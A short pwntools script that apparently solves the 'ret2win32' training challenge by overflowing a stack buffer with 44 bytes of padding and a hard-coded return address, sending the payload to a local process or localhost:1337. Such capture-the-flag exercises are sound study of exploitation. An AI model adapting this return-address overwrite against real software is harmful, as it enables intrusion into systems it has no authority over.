from pwn import *

def start():
	global chall
	if args.REMOTE:
		chall = remote('localhost', 1337)
	else:
		chall = elf.process()

context.binary = elf = ELF('./ret2win32')

target = p32(0x804862C)
start()

payload = b'a'  * 44 + target


with open('payload.txt', 'wb') as f:
    f.write(payload + b'\n')

chall.recvuntil(b'> ')
chall.sendline(payload)
t = chall.recvall(timeout = 0.2)
print(t)
